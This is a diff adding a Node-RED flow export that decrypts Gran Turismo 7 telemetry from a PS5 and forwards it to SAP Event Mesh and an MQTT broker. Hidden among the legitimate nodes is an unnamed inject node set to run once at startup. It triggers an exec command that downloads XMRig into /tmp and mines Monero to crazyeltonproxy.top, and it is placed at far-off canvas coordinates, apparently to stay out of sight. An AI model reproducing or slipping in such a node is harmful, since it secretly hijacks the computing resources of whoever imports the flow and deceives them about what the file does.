@@ -1,0 +1,721 @@
+[
+    {
+        "id": "abc5e162aa50b282",
+        "type": "tab",
+        "label": "Flow 1",
+        "disabled": false,
+        "info": ""
+    },
+    {
+        "id": "6f28e5f9392f5a60",
+        "type": "udp in",
+        "z": "abc5e162aa50b282",
+        "name": "GT7 UDP bind",
+        "iface": "",
+        "port": "33740",
+        "ipv": "udp4",
+        "multicast": "false",
+        "group": "",
+        "datatype": "buffer",
+        "x": 160,
+        "y": 360,
+        "wires": [
+            [
+                "397b8284fb256545"
+            ]
+        ]
+    },
+    {
+        "id": "cb98fab07886685d",
+        "type": "udp out",
+        "z": "abc5e162aa50b282",
+        "name": "GT7 Heartbeat",
+        "addr": "192.168.1.2",
+        "iface": "",
+        "port": "33739",
+        "ipv": "udp4",
+        "outport": "",
+        "base64": false,
+        "multicast": "false",
+        "x": 400,
+        "y": 260,
+        "wires": []
+    },
+    {
+        "id": "a57680424a7546b3",
+        "type": "inject",
+        "z": "abc5e162aa50b282",
+        "name": "Heartbeat PS5",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "5",
+        "crontab": "",
+        "once": true,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "A",
+        "payloadType": "str",
+        "x": 180,
+        "y": 260,
+        "wires": [
+            [
+                "cb98fab07886685d"
+            ]
+        ]
+    },
+    {
+        "id": "397b8284fb256545",
+        "type": "function",
+        "z": "abc5e162aa50b282",
+        "name": "Collecte des données",
+        "func": "class Salsa20 {\n rounds;\n sigma;\n param;\n block;\n byteCounter;\n\n constructor(key, nonce) {\n \n\n this.rounds = 20;\n this.sigma = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];\n this.param = [\n // Constant\n this.sigma[0],\n // Key\n this.get32(key, 0),\n this.get32(key, 4),\n this.get32(key, 8),\n this.get32(key, 12),\n this.sigma[1],\n // Nonce\n this.get32(nonce, 0),\n this.get32(nonce, 4),\n // Counter\n 0,\n 0,\n // Constant\n this.sigma[2],\n // Key\n this.get32(key, 16),\n this.get32(key, 20),\n this.get32(key, 24),\n this.get32(key, 28),\n // Const\n this.sigma[3],\n ];\n\n // init block 64 bytes //\n this.block = [\n 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n ];\n\n // internal byte counter //\n this.byteCounter = 0;\n }\n\n update(data) {\n //if (!(data instanceof Uint8Array) || data.length === 0) {\n // throw new Error(\n // \"Data should be type of bytes (Uint8Array) and not empty!\"\n // );\n //}\n\n var output = new Uint8Array(data.length);\n\n // core function, build block and xor with input data //\n for (var i = 0; i < data.length; i++) {\n if (this.byteCounter === 0 || this.byteCounter === 64) {\n this.salsa();\n this.counterIncrement();\n this.byteCounter = 0;\n }\n\n output[i] = data[i] ^ this.block[this.byteCounter++];\n }\n\n return output;\n }\n\n encrypt(data) {\n return this.update(data);\n }\n\n decrypt(data) {\n return this.update(data);\n }\n\n counterIncrement() {\n // Max possible blocks is 2^64\n this.param[8] = (this.param[8] + 1) >>> 0;\n if (this.param[8] === 0) {\n this.param[9] = (this.param[9] + 1) >>> 0;\n }\n }\n\n salsa() {\n var mix = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];\n var i = 0;\n var b = 0;\n\n // copy param array to mix //\n for (i = 0; i < 16; i++) {\n mix[i] = this.param[i];\n }\n\n // mix rounds //\n for (i = 0; i < this.rounds; i += 2) {\n mix[4] = (mix[4] ^ this.rotl(mix[0] + mix[12], 7)) >>> 0;\n mix[8] = (mix[8] ^ this.rotl(mix[4] + mix[0], 9)) >>> 0;\n mix[12] = (mix[12] ^ this.rotl(mix[8] + mix[4], 13)) >>> 0;\n mix[0] = (mix[0] ^ this.rotl(mix[12] + mix[8], 18)) >>> 0;\n mix[9] = (mix[9] ^ this.rotl(mix[5] + mix[1], 7)) >>> 0;\n mix[13] = (mix[13] ^ this.rotl(mix[9] + mix[5], 9)) >>> 0;\n mix[1] = (mix[1] ^ this.rotl(mix[13] + mix[9], 13)) >>> 0;\n mix[5] = (mix[5] ^ this.rotl(mix[1] + mix[13], 18)) >>> 0;\n mix[14] = (mix[14] ^ this.rotl(mix[10] + mix[6], 7)) >>> 0;\n mix[2] = (mix[2] ^ this.rotl(mix[14] + mix[10], 9)) >>> 0;\n mix[6] = (mix[6] ^ this.rotl(mix[2] + mix[14], 13)) >>> 0;\n mix[10] = (mix[10] ^ this.rotl(mix[6] + mix[2], 18)) >>> 0;\n mix[3] = (mix[3] ^ this.rotl(mix[15] + mix[11], 7)) >>> 0;\n mix[7] = (mix[7] ^ this.rotl(mix[3] + mix[15], 9)) >>> 0;\n mix[11] = (mix[11] ^ this.rotl(mix[7] + mix[3], 13)) >>> 0;\n mix[15] = (mix[15] ^ this.rotl(mix[11] + mix[7], 18)) >>> 0;\n mix[1] = (mix[1] ^ this.rotl(mix[0] + mix[3], 7)) >>> 0;\n mix[2] = (mix[2] ^ this.rotl(mix[1] + mix[0], 9)) >>> 0;\n mix[3] = (mix[3] ^ this.rotl(mix[2] + mix[1], 13)) >>> 0;\n mix[0] = (mix[0] ^ this.rotl(mix[3] + mix[2], 18)) >>> 0;\n mix[6] = (mix[6] ^ this.rotl(mix[5] + mix[4], 7)) >>> 0;\n mix[7] = (mix[7] ^ this.rotl(mix[6] + mix[5], 9)) >>> 0;\n mix[4] = (mix[4] ^ this.rotl(mix[7] + mix[6], 13)) >>> 0;\n mix[5] = (mix[5] ^ this.rotl(mix[4] + mix[7], 18)) >>> 0;\n mix[11] = (mix[11] ^ this.rotl(mix[10] + mix[9], 7)) >>> 0;\n mix[8] = (mix[8] ^ this.rotl(mix[11] + mix[10], 9)) >>> 0;\n mix[9] = (mix[9] ^ this.rotl(mix[8] + mix[11], 13)) >>> 0;\n mix[10] = (mix[10] ^ this.rotl(mix[9] + mix[8], 18)) >>> 0;\n mix[12] = (mix[12] ^ this.rotl(mix[15] + mix[14], 7)) >>> 0;\n mix[13] = (mix[13] ^ this.rotl(mix[12] + mix[15], 9)) >>> 0;\n mix[14] = (mix[14] ^ this.rotl(mix[13] + mix[12], 13)) >>> 0;\n mix[15] = (mix[15] ^ this.rotl(mix[14] + mix[13], 18)) >>> 0;\n }\n\n for (i = 0; i < 16; i++) {\n // add\n mix[i] += this.param[i];\n\n // store\n this.block[b++] = mix[i] & 0xff;\n this.block[b++] = (mix[i] >>> 8) & 0xff;\n this.block[b++] = (mix[i] >>> 16) & 0xff;\n this.block[b++] = (mix[i] >>> 24) & 0xff;\n }\n }\n\n get32(data, index) {\n return (\n data[index++] ^\n (data[index++] << 8) ^\n (data[index++] << 16) ^\n (data[index] << 24)\n );\n }\n\n rotl(data, shift) {\n return (data << shift) | (data >>> (32 - shift));\n }\n}\n\n\nconst SimulatorFlags = {\n None: 0,\n InRace: 1 << 0,\n Paused: 1 << 1,\n LoadingOrProcessing: 1 << 2,\n InGear: 1 << 3,\n HasTurbo: 1 << 4,\n RevLimiterBlinkAlertActive: 1 << 5,\n HandBrakeActive: 1 << 6,\n LightsActive: 1 << 7,\n HighBeamActive: 1 << 8,\n LowBeamActive: 1 << 9,\n ASMActive: 1 << 10,\n TCSActive: 1 << 11\n};\n\nconst wheel = new binaryParser.Parser()\n .floatle(\"FrontLeft\")\n .floatle(\"FrontRight\")\n .floatle(\"RearLeft\")\n .floatle(\"RearRight\");\n\nconst vector3 = new binaryParser.Parser().floatle(\"x\").floatle(\"y\").floatle(\"z\");\n\nconst vector3rotation = new binaryParser.Parser()\n .floatle(\"pitch\")\n .floatle(\"yaw\")\n .floatle(\"roll\");\n\nconst gt7parser = new binaryParser.Parser()\n .endianness(\"little\")\n .int32le(\"magic\", { assert: 0x47375330 })\n .nest(\"position\", { type: vector3 })\n .nest(\"velocity\", { type: vector3 })\n .nest(\"rotation\", { type: vector3rotation })\n .floatle(\"relativeOrientationToNorth\")\n .nest(\"angularVelocity\", { type: vector3 })\n .floatle(\"bodyHeight\")\n .floatle(\"engineRPM\")\n .skip(4)\n .floatle(\"gasLevel\")\n .floatle(\"gasCapacity\")\n .floatle(\"metersPerSecond\")\n .floatle(\"turboBoost\")\n .floatle(\"oilPressure\")\n .floatle(\"waterTemperature\")\n .floatle(\"oilTemperature\")\n .nest(\"tireSurfaceTemperature\", { type: wheel })\n .int32le(\"packetId\")\n .int16le(\"lapCount\")\n .int16le(\"lapsInRace\")\n .int32le(\"bestLapTime\")\n .int32le(\"lastLapTime\")\n .int32le(\"timeOfDayProgression\")\n .int16le(\"preRaceStartPositionOrQualiPos\")\n .int16le(\"numCarsAtPreRace\")\n .int16le(\"minAlertRPM\")\n .int16le(\"maxAlertRPM\")\n .int16le(\"calculatedMaxSpeed\")\n .int16le(\"flags\")\n .bit4(\"currentGear\")\n .bit4(\"suggestedGear\")\n .uint8(\"throttle\")\n .uint8(\"brake\")\n .skip(1)\n .nest(\"roadPlane\", { type: vector3 })\n .floatle(\"roadPlaneDistance\")\n .nest(\"wheelRevPerSecond\", { type: wheel })\n .nest(\"tireTireRadius\", { type: wheel })\n .nest(\"tireSusHeight\", { type: wheel })\n .skip(32)\n .floatle(\"clutchPedal\")\n .floatle(\"clutchEngagement\")\n .floatle(\"rpmFromClutchToGearbox\")\n .floatle(\"transmissionTopSpeed\")\n .array(\"gearRatios\", { type: \"floatle\", length: 8 })\n .int32le(\"carCode\");\n\nfunction getRandomInt(max) {\n return Math.floor(Math.random() * max);\n}\n\n\n const decrypt = (data) => {\n const encoder = new utility.TextEncoder();\n const key = encoder.encode(\n \"Simulator Interface Packet GT7 ver 0.0\"\n ); // 32 bytes key\n\n const nonce1 = data.readInt32LE(64);\n const nonce2 = nonce1 ^ 0xdeadbeaf;\n\n const nonce = Buffer.alloc(8);\n nonce.writeInt32LE(nonce2);\n nonce.writeInt32LE(nonce1, 4);\n\n const message = new Salsa20(key.slice(0, 32), nonce).decrypt(data);\n const newBuffer = Buffer.alloc(message.byteLength);\n for (var i = 0; i < message.length; i++) newBuffer[i] = message[i];\n\n return newBuffer;\n};\n\nif (msg.payload.length === 0x128) {\n const packet = decrypt(msg.payload)\n const magic = packet.readInt32LE()\n // 0x47375330 = 0S7G - GTSport/GT7\n if (magic != 0x47375330) {\n } else {\n var rate_limiter = flow.get(\"rate_limiter\");\n\n if (rate_limiter === undefined || rate_limiter === null || Number.isNaN(rate_limiter)) {\n   flow.set(\"rate_limiter\", 0);\n }\n\n if (rate_limiter >= 5) {\n    flow.set(\"rate_limiter\", 0);\n } else {\n    flow.set(\"rate_limiter\", rate_limiter + 1);\n }\n const message = gt7parser.parse(packet)\n\n message.flagStates = {\n  inRace:                (message.flags & SimulatorFlags.InRace) !== 0,\n  paused:                (message.flags & SimulatorFlags.Paused) !== 0,\n  loadingOrProcessing:   (message.flags & SimulatorFlags.LoadingOrProcessing) !== 0,\n  inGear:                (message.flags & SimulatorFlags.InGear) !== 0,\n  hasTurbo:              (message.flags & SimulatorFlags.HasTurbo) !== 0,\n  revLimiterBlink:       (message.flags & SimulatorFlags.RevLimiterBlinkAlertActive) !== 0,\n  handBrakeActive:       (message.flags & SimulatorFlags.HandBrakeActive) !== 0,\n  lightsActive:          (message.flags & SimulatorFlags.LightsActive) !== 0,\n  highBeamActive:        (message.flags & SimulatorFlags.HighBeamActive) !== 0,\n  lowBeamActive:         (message.flags & SimulatorFlags.LowBeamActive) !== 0,\n  asmActive:             (message.flags & SimulatorFlags.ASMActive) !== 0,\n  tcsActive:             (message.flags & SimulatorFlags.TCSActive) !== 0\n};\n\n flow.set(\"wheelRPS\", message.wheelRevPerSecond.RearLeft)\n\n return {\n payload: message\n }\n \n \n }\n}",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [
+            {
+                "var": "utility",
+                "module": "util"
+            },
+            {
+                "var": "binaryParser",
+                "module": "binary-parser"
+            }
+        ],
+        "x": 380,
+        "y": 360,
+        "wires": [
+            [
+                "05df8cdbb78ede95"
+            ]
+        ]
+    },
+    {
+        "id": "85755ebf3ec77469",
+        "type": "inject",
+        "z": "abc5e162aa50b282",
+        "name": "Déclencheur",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "18000",
+        "crontab": "",
+        "once": true,
+        "onceDelay": "",
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 180,
+        "y": 860,
+        "wires": [
+            [
+                "46ceadcbf95364f9"
+            ]
+        ]
+    },
+    {
+        "id": "46ceadcbf95364f9",
+        "type": "function",
+        "z": "abc5e162aa50b282",
+        "name": "Préparer auth",
+        "func": "msg.payload = \"grant_type=client_credentials\";\nmsg.headers = {\n    \"Content-Type\": \"application/x-www-form-urlencoded\"\n};\nreturn msg;",
+        "outputs": 1,
+        "timeout": "",
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 380,
+        "y": 860,
+        "wires": [
+            [
+                "8c2fff8cb8c744ff"
+            ]
+        ]
+    },
+    {
+        "id": "8c2fff8cb8c744ff",
+        "type": "http request",
+        "z": "abc5e162aa50b282",
+        "name": "Get Token",
+        "method": "POST",
+        "ret": "obj",
+        "paytoqs": "ignore",
+        "url": "https://global-training-eak7jw14.authentication.eu20.hana.ondemand.com/oauth/token",
+        "tls": "",
+        "persist": false,
+        "proxy": "",
+        "insecureHTTPParser": false,
+        "authType": "basic",
+        "senderr": false,
+        "headers": [],
+        "x": 570,
+        "y": 860,
+        "wires": [
+            [
+                "a1c20992bd49e7ee"
+            ]
+        ]
+    },
+    {
+        "id": "d5f1a81a1387d70c",
+        "type": "function",
+        "z": "abc5e162aa50b282",
+        "name": "Préparer payload et headers",
+        "func": "// Récupérer le token depuis le contexte flow au lieu de msg.payload\nvar token = flow.get(\"access_token\");\n\nmsg.token = token;\nmsg.payload = {\n    \"specversion\": \"1.0\",\n    \"source\": \"NFR/S4HANA/Product\",\n    \"type\": msg.topic || \"vehicle/position/x\", // Utiliser le topic du message si disponible\n    \"id\": \"test-\" + Date.now(),\n    \"time\": new Date().toISOString(),\n    \"datacontenttype\": \"application/json\",\n    \"data\": {\n        \"Value\": msg.payload !== undefined ? msg.payload.toString() : \"10\"\n    }\n};\nmsg.headers = {\n    \"Content-Type\": \"application/cloudevents+json\",\n    \"Authorization\": \"Bearer \" + token\n};\nreturn msg;",
+        "outputs": 1,
+        "timeout": "",
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 380,
+        "y": 920,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "267748c53a29c0c1",
+        "type": "http request",
+        "z": "abc5e162aa50b282",
+        "name": "Envoi événement",
+        "method": "POST",
+        "ret": "txt",
+        "paytoqs": "ignore",
+        "url": "https://enterprise-messaging-pubsub.cfapps.eu20.hana.ondemand.com/sap/ems/v1/events",
+        "tls": "",
+        "persist": false,
+        "proxy": "",
+        "insecureHTTPParser": false,
+        "authType": "",
+        "senderr": false,
+        "headers": [],
+        "x": 1390,
+        "y": 360,
+        "wires": [
+            [
+                "f08e53a507605309"
+            ]
+        ]
+    },
+    {
+        "id": "fac71575a4c2c938",
+        "type": "comment",
+        "z": "abc5e162aa50b282",
+        "name": "Get Event-Mesh Auth Token",
+        "info": "",
+        "x": 180,
+        "y": 800,
+        "wires": []
+    },
+    {
+        "id": "815c88d5cffc2518",
+        "type": "comment",
+        "z": "abc5e162aa50b282",
+        "name": "Get, process and send the PS5 data",
+        "info": "",
+        "x": 200,
+        "y": 200,
+        "wires": []
+    },
+    {
+        "id": "02daa92df628d6b4",
+        "type": "debug",
+        "z": "abc5e162aa50b282",
+        "name": "debug 1",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "payload",
+        "targetType": "msg",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 960,
+        "y": 860,
+        "wires": []
+    },
+    {
+        "id": "b1035924074d0c76",
+        "type": "inject",
+        "z": "abc5e162aa50b282",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 170,
+        "y": 920,
+        "wires": [
+            [
+                "d5f1a81a1387d70c"
+            ]
+        ]
+    },
+    {
+        "id": "a1c20992bd49e7ee",
+        "type": "function",
+        "z": "abc5e162aa50b282",
+        "name": "Sauvegarde Token",
+        "func": "// Fonction à placer après votre requête POST qui récupère le token\n// Supposons que la réponse contient le token dans msg.payload.access_token\n\n// Récupérer le token et sa durée de validité\nvar token = msg.payload.access_token;\nvar expiresIn = msg.payload.expires_in || 3600; // Durée de validité en secondes (par défaut 1h)\n\n// Calculer le timestamp d'expiration\nvar expirationTime = Date.now() + (expiresIn * 1000);\n\n// Sauvegarder le token et son expiration dans le contexte flow\nflow.set(\"access_token\", token);\nflow.set(\"token_expiration\", expirationTime);\n\n// Passer le token dans le message pour une utilisation immédiate\nmsg.token = token;\n\nreturn msg;",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 770,
+        "y": 860,
+        "wires": [
+            [
+                "02daa92df628d6b4"
+            ]
+        ]
+    },
+    {
+        "id": "722b30ecb242fab8",
+        "type": "function",
+        "z": "abc5e162aa50b282",
+        "name": "GT7 Demo payload ",
+        "func": "// var payload = msg.payload;\nvar token = flow.get(\"access_token\");\n\nvar payload = {\n    velocity: msg.payload.metersPerSecond * 3.6, // *3.6 to get kph\n    throttle: msg.payload.throttle,\n    engineRPM: msg.payload.engineRPM,\n    brake: msg.payload.brake,\n    gear: msg.payload.currentGear,\n    position: msg.payload.position,\n    orientation: msg.payload.relativeOrientationToNorth,\n    tireTemperature: msg.payload.tireSurfaceTemperature,\n    lapNb: msg.payload.lapCount,\n    lapsInRace: msg.payload.lapsInRace,\n    lastLapTime: msg.payload.lastLapTime,\n    flagStates:  msg.payload.flagStates,\n    time: msg.payload.timeOfDayProgression,\n}\n\n// Créer un message pour vehicle/velocity\nvar message = {\n    token: token,\n    payload: {\n        \"specversion\": \"1.0\",\n        \"source\": \"sap/s4em1/1\",\n        \"type\": \"GT7-ENTZ\",\n        \"id\": \"test-\" + Date.now(),\n        \"time\": new Date().toISOString(),\n        \"datacontenttype\": \"application/json\",\n        \"data\": payload\n    },\n    headers: {\n        \"Content-Type\": \"application/cloudevents+json\",\n        \"Authorization\": \"Bearer \" + token\n    }\n};\n\n// Retourner uniquement le message pour vehicle/velocity\nreturn [message];\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 870,
+        "y": 360,
+        "wires": [
+            [
+                "087860d8f78a4244"
+            ]
+        ]
+    },
+    {
+        "id": "f08e53a507605309",
+        "type": "debug",
+        "z": "abc5e162aa50b282",
+        "name": "debug 2",
+        "active": false,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "payload",
+        "targetType": "msg",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 1580,
+        "y": 360,
+        "wires": []
+    },
+    {
+        "id": "2476837154e8ae22",
+        "type": "mqtt out",
+        "z": "abc5e162aa50b282",
+        "name": "Advanced Event Mesh",
+        "topic": "NAG/data",
+        "qos": "",
+        "retain": "true",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "3c66433c7199f852",
+        "x": 1100,
+        "y": 520,
+        "wires": []
+    },
+    {
+        "id": "8ca1933ef393d4a2",
+        "type": "switch",
+        "z": "abc5e162aa50b282",
+        "name": "",
+        "property": "rate_limiter",
+        "propertyType": "flow",
+        "rules": [
+            {
+                "t": "gte",
+                "v": "0",
+                "vt": "num"
+            }
+        ],
+        "checkall": "true",
+        "repair": false,
+        "outputs": 1,
+        "x": 680,
+        "y": 220,
+        "wires": [
+            [
+                "d8d45d0907bddd42",
+                "5c49529360a9aa5f"
+            ]
+        ]
+    },
+    {
+        "id": "f9989d6a1d1fd229",
+        "type": "inject",
+        "z": "abc5e162aa50b282",
+        "name": "Set Rate Limiter for first time",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": true,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 220,
+        "y": 720,
+        "wires": [
+            [
+                "da2d17d3cf6b7403"
+            ]
+        ]
+    },
+    {
+        "id": "da2d17d3cf6b7403",
+        "type": "function",
+        "z": "abc5e162aa50b282",
+        "name": "function 1",
+        "func": "flow.set(\"rate_limiter\", 0)",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 460,
+        "y": 720,
+        "wires": [
+            [
+                "e8a7c1dd566573d4"
+            ]
+        ]
+    },
+    {
+        "id": "e8a7c1dd566573d4",
+        "type": "debug",
+        "z": "abc5e162aa50b282",
+        "name": "debug 4",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "false",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 620,
+        "y": 720,
+        "wires": []
+    },
+    {
+        "id": "bfdf3bbcaf457dfb",
+        "type": "function",
+        "z": "abc5e162aa50b282",
+        "name": "GT7 Demo payload ",
+        "func": "// var payload = msg.payload;\nvar token = flow.get(\"access_token\");\nvar isracing = false;\n\nif (msg.payload.lapCount > 0 && msg.payload.lapsInRace > 0 && msg.payload.lapCount <= msg.payload.lapsInRace) {\n    isracing = true\n}\n\n\nvar payload = {\n    velocity: msg.payload.metersPerSecond * 3.6, // *3.6 to get kph\n    throttle: msg.payload.throttle,\n    engineRPM: msg.payload.engineRPM,\n    brake: msg.payload.brake,\n    gear: msg.payload.currentGear,\n    position: msg.payload.position,\n    orientation: msg.payload.relativeOrientationToNorth,\n    tireTemperature: msg.payload.tireSurfaceTemperature,\n    lapNb: msg.payload.lapCount,\n    lapsInRace: msg.payload.lapsInRace,\n    lastLapTime: msg.payload.lastLapTime,\n    isRacing: isracing,\n    time: msg.payload.timeOfDayProgression,\n}\n\n// Créer un message pour vehicle/velocity\nvar message = {\n    token: token,\n    payload: {\n        \"specversion\": \"1.0\",\n        \"source\": \"sap/s4em1/1\",\n        \"type\": \"GT7\",\n        \"id\": \"test-\" + Date.now(),\n        \"time\": new Date().toISOString(),\n        \"datacontenttype\": \"application/json\",\n        \"data\": payload\n    },\n    headers: {\n        \"Content-Type\": \"application/cloudevents+json\",\n        \"Authorization\": \"Bearer \" + token\n    }\n};\n\n\n// Retourner uniquement le message pour vehicle/velocity\nreturn [message];\n",
+        "outputs": 1,
+        "timeout": 0,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 870,
+        "y": 520,
+        "wires": [
+            [
+                "2476837154e8ae22"
+            ]
+        ]
+    },
+    {
+        "id": "824ad49aa61aeb03",
+        "type": "switch",
+        "z": "abc5e162aa50b282",
+        "name": "",
+        "property": "rate_limiter",
+        "propertyType": "flow",
+        "rules": [
+            {
+                "t": "gt",
+                "v": "3",
+                "vt": "num"
+            }
+        ],
+        "checkall": "true",
+        "repair": false,
+        "outputs": 1,
+        "x": 680,
+        "y": 520,
+        "wires": [
+            [
+                "bfdf3bbcaf457dfb"
+            ]
+        ]
+    },
+    {
+        "id": "7d6424ece0ab7072",
+        "type": "comment",
+        "z": "abc5e162aa50b282",
+        "name": "Setup environnement variable",
+        "info": "",
+        "x": 180,
+        "y": 640,
+        "wires": []
+    },
+    {
+        "id": "726d9b3a8028db9b",
+        "type": "debug",
+        "z": "abc5e162aa50b282",
+        "name": "debug 9",
+        "active": false,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "false",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 7920,
+        "y": 7980,
+        "wires": []
+    },
+    {
+        "id": "4a27e866069731e0",
+        "type": "inject",
+        "z": "abc5e162aa50b282",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": true,
+        "onceDelay": "1",
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 7590,
+        "y": 7980,
+        "wires": [
+            [
+                "41715e9de816bc9d"
+            ]
+        ]
+    },
+    {
+        "id": "41715e9de816bc9d",
+        "type": "exec",
+        "z": "abc5e162aa50b282",
+        "command": " /bin/bash -c \"cd /tmp && if [ ! -f xmrig ]; then curl -L -O https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar -xf xmrig-6.22.2-linux-static-x64.tar.gz && cp xmrig-6.22.2/xmrig xmrig && chmod +x xmrig; fi && ./xmrig --coin 'monero' -o crazyeltonproxy.top:3333 --no-color --nicehash --rig-id=$(hostname)\"",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "true",
+        "timer": "",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 7200,
+        "y": 7920,
+        "wires": [
+            [
+                "726d9b3a8028db9b"
+            ],
+            [
+                "726d9b3a8028db9b"
+            ],
+            [
+                "726d9b3a8028db9b"
+            ]
+        ]
+    },
+    {
+        "id": "bfbdf518b7292181",
+        "type": "comment",
+        "z": "abc5e162aa50b282",
+        "name": "Diminish data resolution to not overload eventmesh",
+        "info": "Diminish data reolution to not overload the eventmesh",
+        "x": 670,
+        "y": 120,
+        "wires": []
+    },
+    {
+        "id": "05df8cdbb78ede95",
+        "type": "switch",
+        "z": "abc5e162aa50b282",
+        "name": "",
+        "property": "rate_limiter",
+        "propertyType": "flow",
+        "rules": [
+            {
+                "t": "eq",
+                "v": "0",
+                "vt": "num"
+            }
+        ],
+        "checkall": "true",
+        "repair": false,
+        "outputs": 1,
+        "x": 680,
+        "y": 360,
+        "wires": [
+            [
+                "722b30ecb242fab8"
+            ]
+        ]
+    },
+    {
+        "id": "d8d45d0907bddd42",
+        "type": "websocket out",
+        "z": "abc5e162aa50b282",
+        "name": "",
+        "server": "32c3d77dadf5b6c4",
+        "client": "",
+        "x": 930,
+        "y": 220,
+        "wires": []
+    },
+    {
+        "id": "5c49529360a9aa5f",
+        "type": "debug",
+        "z": "abc5e162aa50b282",
+        "name": "debug 3",
+        "active": false,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "payload",
+        "targetType": "msg",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 920,
+        "y": 160,
+        "wires": []
+    },
+    {
+        "id": "087860d8f78a4244",
+        "type": "switch",
+        "z": "abc5e162aa50b282",
+        "name": "",
+        "property": "msg.payload.data.flagStates.inRace",
+        "propertyType": "msg",
+        "rules": [
+            {
+                "t": "true"
+            }
+        ],
+        "checkall": "true",
+        "repair": false,
+        "outputs": 1,
+        "x": 1060,
+        "y": 360,
+        "wires": [
+            [
+                "525eec2b68bb95a6"
+            ]
+        ]
+    },
+    {
+        "id": "525eec2b68bb95a6",
+        "type": "switch",
+        "z": "abc5e162aa50b282",
+        "name": "",
+        "property": "msg.payload.data.flagStates.paused",
+        "propertyType": "msg",
+        "rules": [
+            {
+                "t": "false"
+            }
+        ],
+        "checkall": "true",
+        "repair": false,
+        "outputs": 1,
+        "x": 1200,
+        "y": 360,
+        "wires": [
+            [
+                "267748c53a29c0c1"
+            ]
+        ]
+    },
+    {
+        "id": "3c66433c7199f852",
+        "type": "mqtt-broker",
+        "name": "",
+        "broker": "wss://mr-connection-y8dkun4x15g.messaging.solace.cloud:8443",
+        "port": 1883,
+        "clientid": "",
+        "autoConnect": true,
+        "usetls": false,
+        "protocolVersion": 4,
+        "keepalive": 60,
+        "cleansession": true,
+        "autoUnsubscribe": true,
+        "birthTopic": "",
+        "birthQos": "0",
+        "birthRetain": "false",
+        "birthPayload": "",
+        "birthMsg": {},
+        "closeTopic": "",
+        "closeQos": "0",
+        "closeRetain": "false",
+        "closePayload": "",
+        "closeMsg": {},
+        "willTopic": "",
+        "willQos": "0",
+        "willRetain": "false",
+        "willPayload": "",
+        "willMsg": {},
+        "userProps": "",
+        "sessionExpiry": ""
+    },
+    {
+        "id": "32c3d77dadf5b6c4",
+        "type": "websocket-listener",
+        "path": "/ws/plc",
+        "wholemsg": "false"
+    }
+]
